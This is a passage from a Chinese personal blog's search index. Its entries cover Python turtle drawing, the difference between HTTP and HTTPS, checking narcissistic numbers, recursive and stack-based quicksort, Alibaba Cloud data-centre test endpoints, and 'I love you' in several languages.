class="hljs-selector-tag">drawstar</span>(x,y,color):<br>    <span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.up</span>()<br>    <span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.goto</span>(x,y)<br>    <span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.down</span>()<br>    <span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.color</span>(color)<br>    <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-attr">[0,1,2,3,4]</span>:<br>        <span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.right</span>(<span class="hljs-number">144</span>)<br>        <span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.forward</span>(<span class="hljs-number">100</span>)<br>#定义结束<br>#设置小海龟的位置和朝向<br> <br>#绘制第一个五角星<br><span class="hljs-selector-tag">drawstar</span>(-<span class="hljs-number">200</span>,<span class="hljs-number">200</span>,<span class="hljs-string">&quot;blue&quot;</span>)<br> <br>#再一次设置小海龟的位置和朝向<br> <br>#绘制第二个五角星<br><span class="hljs-selector-tag">drawstar</span>(<span class="hljs-number">300</span>,<span class="hljs-number">200</span>,<span class="hljs-string">&quot;green&quot;</span>)<br>     <br>#继续设置小海龟的位置和朝向，并绘制第三、第四个五角星<br><span class="hljs-selector-tag">drawstar</span>(-<span class="hljs-number">200</span>,-<span class="hljs-number">200</span>,<span class="hljs-string">&quot;red&quot;</span>)<br> <br><span class="hljs-selector-tag">drawstar</span>(<span class="hljs-number">300</span>,-<span class="hljs-number">200</span>,<span class="hljs-string">&quot;yellow&quot;</span>)<br> <br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.up</span>()<br><span class="hljs-selector-tag">turtle</span><span class="hljs-selector-class">.home</span>()<br></code></pre></td></tr></table></figure></li></ul><h1 id="函数的参数"><a href="#函数的参数" class="headerlink" title="函数的参数"></a>函数的参数</h1><ul><li>函数的参数：即函数的输入部分，用来存放函数调用时传递来的 初始内容，函数的参数增加了函数的灵活性，允许函数应对不同 的处理情况</li><li>调用函数时，参数的格式必须与函数定义中完全一致</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于http与https之间的区别</title>
    <link href="/2020/03/16.html"/>
    <url>/2020/03/16.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>今天我将博客全部启用了https，这就发现了一个问题，https和http到底有什么区别呢？</p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>谷歌在2018年2月9日宣布从今年的7月起，Chrome浏览器将在地址栏把所有的HTTP网址标示为不安全网站。</p><p>谷歌早在2017年1月发布的Chrome56，开始把要求用户输入密码或信用卡信息的HTTP网页标为不安全；2017年10月发布的Chrome62，开始把需要输入数据的HTTP网页和在Incognito模式下浏览的HTTP网站标为不安全。</p><h1 id="http与https的概念"><a href="#http与https的概念" class="headerlink" title="http与https的概念"></a>http与https的概念</h1><p>http超文本传输协议，是一个客户端和服务端请求和应答的标准，用于WWW服务器传输超文本到本地浏览器的传输协议，可以使浏览器更加高效，减少网络传输。</p><p>https超文本传输安全协议，就是http的安全版本，https是由http进行通信，但利用SSL/TLS来加密数据包。</p><p>HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据隐私与完整性。这个协议由网景公司在1994年首次提出，随后扩展到互联网。</p><a id="more"></a><h1 id="http存在的问题"><a href="#http存在的问题" class="headerlink" title="http存在的问题"></a>http存在的问题</h1><ul><li>易被监听<br>http通信是明文，数据在客户端与服务器通信的过程中，任何一点都可能被劫持。比如，发送了银行卡号和密码，hacker劫取到数据，就可以看到卡号和密码，这是很危险的；</li><li>易被伪装<br>http通信时，无法保证通行双方是合法的，通信方可能是伪装后的。比如你请求birdteam.net，你怎么知道返回的数据就是来自本站，中间人可能返回数据伪装成本站；</li><li>易被篡改<br>hacker中间篡改数据后，接收方并不知道数据已经被更改。</li></ul><h1 id="https解决的问题"><a href="#https解决的问题" class="headerlink" title="https解决的问题"></a>https解决的问题</h1><p>https恰好解决了上述三个问题，https不是一种新协议，它是由http+SSL的结合体，由之前http到tcp，改为了http到SSL到tcp。</p><ul><li>防止监听<br>因为数据是加密的，黑客监听得到的是密文，看不懂的；</li><li>防止伪装<br>https在通信的过程中，客户端和服务器端都是携带证书，证书相当于身份证，有证书就是合法的，没有就是非法，证书由第三方颁布，很难伪造；</li><li>防止篡改<br>https对数据进行摘要处理，即使被篡改也是会被感知的，改了数据也没有用。</li></ul><h1 id="http与https的区别"><a href="#http与https的区别" class="headerlink" title="http与https的区别"></a>http与https的区别</h1><p>http协议传输的数据时未经过加密的，就是明文；</p><p>https在使用http进行通信时，利用SSL进行了加密传输、身份认证的网络协议http+SSL，比http更加安全。</p><ul><li><p>https使用需要CA证书，大部分都是付费使用的<br>CA是Certificate Authority的缩写，也叫证书授权中心，也是需要第三方公司进行授权的。</p></li><li><p>端口不同<br>HTTP的URL是由http://起始且默认使用80端口；</p></li></ul><p>HTTPS的URL是由https://起始且默认使用443端口。</p><h1 id="https的工作原理"><a href="#https的工作原理" class="headerlink" title="https的工作原理"></a>https的工作原理</h1><p>如图所示，https工作原理可以细分为八个步骤：<br><img src="https://birdteam.net/wp-content/uploads/2018/02/201802280312223.jpg" srcset="/img/loading.gif" lazyload alt="原理图"></p><ul><li>客户端发起HTTPS请求<br>用户在浏览器里输入一个https网址，然后连接到server的443端口；</li><li>服务端的配置<br>就是指上述提到的数字证书；</li><li>传送证书<br>Web服务器收到客户端请求后，会将网站的证书信息中包含公钥传送一份给客户端；</li><li>客户解析证书<br>客户会对证书进行判断，验证公钥是否有效，存在问题弹出警告；若没问题，生成一个秘钥，后用证书继续进行加密；</li><li>传送加密信息<br>客户端将上加密后的随机值（私钥）提供给服务端，服务端会对其进行解密；</li><li>服务器端解密信息<br>服务端解密后得到私钥，然后把内容通过该值进行对称性加密。对称加密就是指把要返回的信息和随机值（私钥）混合加密，这样除非知道私钥，不然无法获取数据；</li><li>传输加密后的信息<br>继续将加密后的信息传递给客户；</li><li>客户解密信息<br>客户端用之前生成的秘钥解密服务端传过来的信息，于是获取解密后的内容。</li></ul><h1 id="https的缺点"><a href="#https的缺点" class="headerlink" title="https的缺点"></a>https的缺点</h1><p>https虽然安全性比http高出很多但是也有一些缺点。</p><ul><li>握手阶段费时<br>因为SSL的缘故，HTTPS协议握手阶段会比较费时，会使页面加载时间延长近50%；</li><li>SSL证书要花钱<br>便宜没好货好货不便宜；</li><li>HTTPS连接缓存不如HTTP高效<br>HTTPS连接缓存不如HTTP高效，会增加数据开销和功耗，甚至已有的安全措施也会因此而受到影响；</li><li>SSL证书通常需要绑定IP<br>SSL证书通常需要绑定IP，不可以在同一IP上绑定多个域名，IPv4资源不可能支撑这个消耗；</li><li>有局限性<br>HTTPS协议加密范围也比较有限，黑客攻击、拒绝服务攻击、服务器劫持方面几乎起不到什么作用。最关键的，SSL证书信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间攻击一样可行。</li></ul><p>本文转自菜鸟博—<a href="https://birdteam.net/30333">原文链接</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python判断水仙花数的方法</title>
    <link href="/2020/02/15.html"/>
    <url>/2020/02/15.html</url>
    
    <content type="html"><![CDATA[<h1 id="什么是水仙花数"><a href="#什么是水仙花数" class="headerlink" title="什么是水仙花数"></a>什么是水仙花数</h1><p>水仙花数（Narcissistic number）也被称为超完全数字不变数（pluperfect digital invariant, PPDI）、自恋数、自幂数、阿姆斯壮数或阿姆斯特朗数（Armstrong number），水仙花数是指一个 3 位数，它的每个位上的数字的 3次幂之和等于它本身（例如：1^3 + 5^3+ 3^3 = 153）。</p><h1 id="常见的水仙花数"><a href="#常见的水仙花数" class="headerlink" title="常见的水仙花数"></a>常见的水仙花数</h1><p>水仙花数又称阿姆斯特朗数。<br>三位的水仙花数共有4个：153，370，371，407；<br>四位的四叶玫瑰数共有3个：1634，8208，9474；<br>五位的五角星数共有3个：54748，92727，93084；<br>六位的六合数只有1个：548834；<br>七位的北斗七星数共有4个：1741725，4210818，9800817，9926315；<br>八位的八仙数共有3个：24678050，24678051，88593477<br>……</p><a id="more"></a><h1 id="如何利用python实现的对水仙花数的判断"><a href="#如何利用python实现的对水仙花数的判断" class="headerlink" title="如何利用python实现的对水仙花数的判断"></a>如何利用python实现的对水仙花数的判断</h1><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta">#第一种</span><br><span class="hljs-meta">#提示用户输入三位数字</span><br>abc = <span class="hljs-keyword">int</span>(input(<span class="hljs-string">&quot;请输入三位数：&quot;</span>))<br><span class="hljs-meta">#计算判断并输出结果</span><br>print(<span class="hljs-string">&quot;水仙花数&quot;</span> <span class="hljs-keyword">if</span> abc==(abc<span class="hljs-comment">//10**2)**3+(abc%10**2//10)**3+(abc%10)**3 else &quot;不是水仙花数&quot; )</span><br><br><br><br><span class="hljs-meta">#第二种</span><br><span class="hljs-meta">#提示用户输入</span><br>y = <span class="hljs-keyword">int</span>(input(<span class="hljs-string">&quot;请输入三位数:&quot;</span>))<br><span class="hljs-meta">#分离数值</span><br>a = y<span class="hljs-comment">//10**2 #百位</span><br>b = y%<span class="hljs-number">10</span>**<span class="hljs-number">2</span><span class="hljs-comment">//10 #十位</span><br>c = y%<span class="hljs-number">10</span> #个位<br><span class="hljs-meta">#计算</span><br>z = a**<span class="hljs-number">3</span>+b**<span class="hljs-number">3</span>+c**<span class="hljs-number">3</span><br><span class="hljs-meta">#判断与输出</span><br>print(<span class="hljs-string">&quot;水仙花数&quot;</span>) <span class="hljs-keyword">if</span> y==z <span class="hljs-keyword">else</span> print(<span class="hljs-string">&quot;不是水仙花数&quot;</span>)<br><br><br><span class="hljs-meta">#第三种</span><br><span class="hljs-meta">#提示用户输入</span><br>y = input(<span class="hljs-string">&quot;请输入三位数:&quot;</span>)<br><span class="hljs-meta">#分离数值</span><br>a = <span class="hljs-keyword">int</span>(y[:<span class="hljs-number">1</span>]) #百位<br><span class="hljs-meta">#print(a)</span><br>b = <span class="hljs-keyword">int</span>(y[<span class="hljs-number">1</span>:<span class="hljs-number">2</span>]) #十位<br><span class="hljs-meta">#print(b)</span><br>c = <span class="hljs-keyword">int</span>(y[<span class="hljs-number">2</span>:]) #个位<br><span class="hljs-meta">#print(c)</span><br><span class="hljs-meta">#计算</span><br>z = a**<span class="hljs-number">3</span>+b**<span class="hljs-number">3</span>+c**<span class="hljs-number">3</span><br><span class="hljs-meta">#print(z)</span><br><span class="hljs-meta">#将y的值转化为数值</span><br>y = <span class="hljs-keyword">int</span>(y)<br><span class="hljs-meta">#判断与输出</span><br>print(<span class="hljs-string">&quot;水仙花数&quot;</span>) <span class="hljs-keyword">if</span> y==z <span class="hljs-keyword">else</span> print(<span class="hljs-string">&quot;不是水仙花数&quot;</span>)<br></code></pre></td></tr></table></figure><p>以上只是提供了三种方法。</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python实现快速排序的两种方法</title>
    <link href="/2020/02/14.html"/>
    <url>/2020/02/14.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>代码环境：python3.6</p></blockquote><h1 id="递归实现"><a href="#递归实现" class="headerlink" title="递归实现"></a>递归实现</h1><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ul><li>从序列中挑出任意一个元素为<code>pivot</code>，此处选择序列最后一个元素，如果更改，需要相应变更以下步骤内容；</li><li>设置两个指针<code>left</code>和<code>right</code>，指向序列的最左和最右两个元素；</li><li>从<code>left</code>开始，找到第一个比<code>pivot</code>大的元素；切换到<code>right</code>，找到第一个比<code>pivot</code>小的元素；</li><li>将<code>left</code>和<code>right</code>此时指向的元素互换；</li><li>重复<code>1-4</code>步骤，直到<code>left==right</code>，将<code>pivot</code>和<code>left</code>对应的元素互换，这样以<code>pivot</code>分割左右两个区，左边元素都比<code>pivot</code>小，右边元素都比<code>pivot</code>大；</li><li>将两个分区分别递归重复<code>1-5</code>步骤，直到不可再分区，递归条件就是<code>start&lt;end</code>。<a id="more"></a></li></ul><h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs sql">def <span class="hljs-keyword">partition</span>(mylist, <span class="hljs-keyword">start</span>, <span class="hljs-keyword">end</span>):<br>    # 若选其他元素作为pivot，下面的while内容需要相应更改<br>    pivot <span class="hljs-operator">=</span> mylist[<span class="hljs-keyword">end</span>]<br>    <span class="hljs-keyword">left</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">start</span><br>    <span class="hljs-keyword">right</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">end</span><br><br>    while <span class="hljs-keyword">left</span> <span class="hljs-operator">&lt;</span> <span class="hljs-keyword">right</span>:<br>        while <span class="hljs-keyword">left</span> <span class="hljs-operator">&lt;</span> <span class="hljs-keyword">right</span> <span class="hljs-keyword">and</span> mylist[<span class="hljs-keyword">left</span>] <span class="hljs-operator">&lt;=</span> pivot:<br>            <span class="hljs-keyword">left</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>        while <span class="hljs-keyword">left</span> <span class="hljs-operator">&lt;</span> <span class="hljs-keyword">right</span> <span class="hljs-keyword">and</span> mylist[<span class="hljs-keyword">right</span>] <span class="hljs-operator">&gt;=</span> pivot:<br>            <span class="hljs-keyword">right</span> <span class="hljs-operator">-</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>        if <span class="hljs-keyword">left</span> <span class="hljs-operator">!=</span> <span class="hljs-keyword">right</span>:<br>            mylist[<span class="hljs-keyword">left</span>], mylist[<span class="hljs-keyword">right</span>] <span class="hljs-operator">=</span> mylist[<span class="hljs-keyword">right</span>], mylist[<span class="hljs-keyword">left</span>]<br><br>    mylist[<span class="hljs-keyword">end</span>], mylist[<span class="hljs-keyword">left</span>] <span class="hljs-operator">=</span> mylist[<span class="hljs-keyword">left</span>], pivot<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">left</span><br><br><br>def quick_sort(mylist, <span class="hljs-keyword">start</span>, <span class="hljs-keyword">end</span>):<br>    &quot;&quot;&quot;<br>    mylist: 待排序的 list<br>    start: mylist第一个元素索引<br>    end: mylist最后一个元素索引<br>    &quot;&quot;&quot;<br>    if <span class="hljs-keyword">start</span> <span class="hljs-operator">&lt;</span> <span class="hljs-keyword">end</span>:<br>        mid <span class="hljs-operator">=</span> <span class="hljs-keyword">partition</span>(mylist, <span class="hljs-keyword">start</span>, <span class="hljs-keyword">end</span>)<br>        quick_sort(mylist, <span class="hljs-keyword">start</span>, mid <span class="hljs-operator">-</span> <span class="hljs-number">1</span>)<br>        quick_sort(mylist, mid <span class="hljs-operator">+</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">end</span>)<br><br><br>if __name__ <span class="hljs-operator">=</span><span class="hljs-operator">=</span> &quot;__main__&quot;:<br>    mylist <span class="hljs-operator">=</span> [<span class="hljs-number">12</span>, <span class="hljs-number">33</span>, <span class="hljs-number">199</span>, <span class="hljs-number">0</span>, <span class="hljs-number">54</span>, <span class="hljs-number">77</span>, <span class="hljs-number">11</span>, <span class="hljs-number">54</span>, <span class="hljs-number">9</span>, <span class="hljs-number">7</span>]<br>    quick_sort(mylist, <span class="hljs-number">0</span>, len(mylist) <span class="hljs-operator">-</span> <span class="hljs-number">1</span>)<br>    print(f<span class="hljs-string">&#x27;快速排序后：&#123;mylist&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="非递归实现"><a href="#非递归实现" class="headerlink" title="非递归实现"></a>非递归实现</h1><p>绝大多数用递归实现的问题，都可以用<code>栈</code>的方式来代替。</p><p>为什么？因为我们代码中一层层的方法调用，本身就是一个函数栈，每次进入一个新方法，就相当于入栈；每次有方法返回，就相当于出栈。</p><p>所以，我们可以利用栈存储每一次调用方法的参数。</p><h2 id="算法实现-1"><a href="#算法实现-1" class="headerlink" title="算法实现"></a>算法实现</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">class Stack():<br>    <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;简单实现一个栈，本质就是个list&quot;</span><span class="hljs-string">&quot;&quot;</span><br>    def __init__(self):<br>        self.<span class="hljs-keyword">items</span> = []<br><br>    def is_empty(self):<br>        <span class="hljs-literal">return</span> self.<span class="hljs-keyword">items</span> == []<br><br>    def push(self, <span class="hljs-keyword">item</span>):<br>        self.<span class="hljs-keyword">items</span>.append(<span class="hljs-keyword">item</span>)<br><br>    def pop(self):<br>        <span class="hljs-literal">return</span> self.<span class="hljs-keyword">items</span>.pop()<br><br><br><span class="hljs-comment"># 此方法与上面例子一样，保持不变</span><br>def partition(mylist, <span class="hljs-built_in">start</span>, <span class="hljs-keyword">end</span>):<br>    <span class="hljs-comment"># 若选其他元素作为pivot，下面的while内容需要相应更改</span><br>    pivot = mylist[<span class="hljs-keyword">end</span>]<br>    left = <span class="hljs-built_in">start</span><br>    <span class="hljs-literal">right</span> = <span class="hljs-keyword">end</span><br><br>    <span class="hljs-keyword">while</span> left &lt; <span class="hljs-literal">right</span>:<br>        <span class="hljs-keyword">while</span> left &lt; <span class="hljs-literal">right</span> <span class="hljs-keyword">and</span> mylist[left] &lt;= pivot:<br>            left += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> left &lt; <span class="hljs-literal">right</span> <span class="hljs-keyword">and</span> mylist[<span class="hljs-literal">right</span>] &gt;= pivot:<br>            <span class="hljs-literal">right</span> -= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> left != <span class="hljs-literal">right</span>:<br>            mylist[left], mylist[<span class="hljs-literal">right</span>] = mylist[<span class="hljs-literal">right</span>], mylist[left]<br><br>    mylist[<span class="hljs-keyword">end</span>], mylist[left] = mylist[left], pivot<br>    <span class="hljs-literal">return</span> left<br><br><br>def quick_sort(mylist):<br>    stack = Stack()<br>    <span class="hljs-built_in">start</span> = <span class="hljs-number">0</span><br>    <span class="hljs-function"><span class="hljs-keyword">end</span> = <span class="hljs-title">len</span>(<span class="hljs-title">mylist</span>) - <span class="hljs-title">1</span></span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">start</span> &lt; <span class="hljs-keyword">end</span>:<br>        stack.push((<span class="hljs-built_in">start</span>, <span class="hljs-keyword">end</span>))<br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> stack.is_empty():<br>            <span class="hljs-built_in">start</span>, <span class="hljs-function"><span class="hljs-keyword">end</span> = <span class="hljs-title">stack</span>.<span class="hljs-title">pop</span>()</span><br>            <span class="hljs-keyword">mid</span> = partition(mylist, <span class="hljs-built_in">start</span>, <span class="hljs-keyword">end</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">start</span> &lt; <span class="hljs-keyword">mid</span> - <span class="hljs-number">1</span>:<br>                stack.push((<span class="hljs-built_in">start</span>, <span class="hljs-keyword">mid</span> - <span class="hljs-number">1</span>))<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">mid</span> + <span class="hljs-number">1</span> &lt; <span class="hljs-keyword">end</span>:<br>                stack.push((<span class="hljs-keyword">mid</span> + <span class="hljs-number">1</span>, <span class="hljs-keyword">end</span>))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>阿里云服务器地域及18个数据中心测试地址</title>
    <link href="/2020/02/11.html"/>
    <url>/2020/02/11.html</url>
    
    <content type="html"><![CDATA[<h1 id="服务器地域分布"><a href="#服务器地域分布" class="headerlink" title="服务器地域分布"></a>服务器地域分布</h1><h2 id="地域（Region）"><a href="#地域（Region）" class="headerlink" title="地域（Region）"></a>地域（Region）</h2><p>地域是指物理的数据中心。资源创建成功后不能更换地域。当前所有的地域、地域所在城市和 Region ID 的对照关系如下表所示。</p><ul><li><p>中国大陆<br><img src="https://s2.ax1x.com/2020/02/22/3MXEOH.png" srcset="/img/loading.gif" lazyload alt="1"></p></li><li><p>其他国家及地区<br><img src="https://s2.ax1x.com/2020/02/22/3MX36g.png" srcset="/img/loading.gif" lazyload alt="2"></p></li></ul><p>选择地域时，您需要考虑以下几个因素：</p><h2 id="地理位置"><a href="#地理位置" class="headerlink" title="地理位置"></a>地理位置</h2><p>请根据您以及您目标用户所在的地理位置选择地域。</p><a id="more"></a><p>中国大陆<br>一般情况下建议选择和您目标用户所在地域最为接近的数据中心，可以进一步提升用户访问速度。不过，在基础设施、BGP 网络品质、服务质量、云服务器操作使用与配置等方面，阿里云中国大陆地域没有太大区别。BGP 网络可以保证中国大陆全部地域的快速访问。</p><p>其他国家及地区<br>其他国家及地区提供国际带宽，主要面向非中国大陆地区用户。如果您在中国大陆，使用这些地域会有较长的访问延迟，不建议您使用。<br>对中国香港、东南亚有需求的用户，可以选择中国香港地域、亚太东南 1 地域、亚太东南 3 地域或亚太东南 5 地域。<br>对日、韩有需求的用户，可以选择亚太东北 1 地域。<br>对印度有需求的用户，可以选择亚太南部 1 地域。<br>对澳大利亚地区有需求的用户，可以选择亚太东南 2 地域。<br>对美洲有需求用户，可以选择美国地域。<br>对欧洲大陆有需求的用户，可以选择欧洲中部 1 地域。<br>对中东地区有需求的用户，可以选择中东东部 1 地域。</p><h1 id="18个数据中心测试地址"><a href="#18个数据中心测试地址" class="headerlink" title="18个数据中心测试地址"></a>18个数据中心测试地址</h1><p>用户在选择阿里云服务器的时候是不是感觉阿里云的数据中心太多太多，确实阿里云服务器机房是有很多，国外国外机房大约有18个，甚至更多，因为还在不断的增加机房。对于商家而言增加不同的机房可以满足不同的项目和地区用户需要。其次，我们有些用户项目也是需要多机房的。<br>在众多机房中，对于新选择阿里云服务器的用户来说确实是比较难以选择。因为我们不清楚各个机房的速度如何。所以，在这篇文章中，云部落有找到阿里云官方提供的18个数据中心的测试地址，我们可以进行PING速度测试、路由追踪测试等测试手段。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stylus">华东 <span class="hljs-number">1</span> oss-cn-hangzhou<span class="hljs-selector-class">.aliyuncs</span>.com<br>华东 <span class="hljs-number">2</span> oss-cn-shanghai<span class="hljs-selector-class">.aliyuncs</span>.com<br>华北 <span class="hljs-number">1</span> oss-cn-qingdao<span class="hljs-selector-class">.aliyuncs</span>.com<br>华北 <span class="hljs-number">2</span> oss-cn-beijing<span class="hljs-selector-class">.aliyuncs</span>.com<br>华北 <span class="hljs-number">3</span> oss-cn-zhangjiakou<span class="hljs-selector-class">.aliyuncs</span>.com<br>华北 <span class="hljs-number">5</span> oss-cn-huhehaote<span class="hljs-selector-class">.aliyuncs</span>.com<br>华南 <span class="hljs-number">1</span> oss-cn-shenzhen<span class="hljs-selector-class">.aliyuncs</span>.com<br>香港 oss-cn-hongkong<span class="hljs-selector-class">.aliyuncs</span>.com<br>美国西部 <span class="hljs-number">1</span> （硅谷） oss-us-west-<span class="hljs-number">1</span><span class="hljs-selector-class">.aliyuncs</span>.com<br>美国东部 <span class="hljs-number">1</span> （弗吉尼亚） oss-us-east-<span class="hljs-number">1</span><span class="hljs-selector-class">.aliyuncs</span>.com<br>亚太东南 <span class="hljs-number">1</span> （新加坡） oss-ap-southeast-<span class="hljs-number">1</span><span class="hljs-selector-class">.aliyuncs</span>.com<br>亚太东南 <span class="hljs-number">2</span> （悉尼） oss-ap-southeast-<span class="hljs-number">2</span><span class="hljs-selector-class">.aliyuncs</span>.com<br>亚太东南 <span class="hljs-number">3</span> （吉隆坡） oss-ap-southeast-<span class="hljs-number">3</span><span class="hljs-selector-class">.aliyuncs</span>.com<br>亚太东南 <span class="hljs-number">5</span> （雅加达） oss-ap-southeast-<span class="hljs-number">5</span><span class="hljs-selector-class">.aliyuncs</span>.com<br>亚太南部 <span class="hljs-number">1</span> （孟买） oss-ap-south-<span class="hljs-number">1</span><span class="hljs-selector-class">.aliyuncs</span>.com<br>亚太东北 <span class="hljs-number">1</span> （日本） oss-ap-northeast-<span class="hljs-number">1</span><span class="hljs-selector-class">.aliyuncs</span>.com<br>欧洲中部 <span class="hljs-number">1</span> （法兰克福） oss-eu-central-<span class="hljs-number">1</span><span class="hljs-selector-class">.aliyuncs</span>.com<br>中东东部 <span class="hljs-number">1</span> （迪拜） oss-me-east-<span class="hljs-number">1</span><span class="hljs-selector-class">.aliyuncs</span>.com<br></code></pre></td></tr></table></figure><h1 id="测速方法"><a href="#测速方法" class="headerlink" title="测速方法"></a>测速方法</h1><ul><li>PING测试：<a href="http://ping.chinaz.com/">ping.chinaz.com</a></li><li>路由回程：<a href="https://www.ipip.net/traceroute.php">https://www.ipip.net/traceroute.php</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>daily</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>各国语言说我爱你，超简单！</title>
    <link href="/2020/02/8.html"/>
    <url>/2020/02/8.html</url>
    
    <content type="html"><![CDATA[<p>1、韩文：사랑해 </p><ul><li>发音：撒浪嘿哟</li></ul><p>2、英文：I love you</p><ul><li>发音：爱老虎油</li></ul><p>3、法文：je t’aime</p><ul><li>发音：热它么（感觉有点像骂人呢……）<a id="more"></a></li></ul><p>4、西班牙文：te quiero </p><ul><li>发音：得（轻声）给（一声）偌（四声）</li></ul><p>5、德文：ich liebe dich</p><ul><li>发音:一史咧北迪史</li></ul><p>6、葡萄牙文:eu te amo</p><ul><li>发音:于特啊摸</li></ul><p>7、意大利文:ti amo</p><ul><li>发音:第阿冒</li></ul><p>这些不同语言说“我爱你”学会了吗?是不是超简单呢?</p>]]></content>
    
    
    
    <tags>
      
      <tag>daily</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
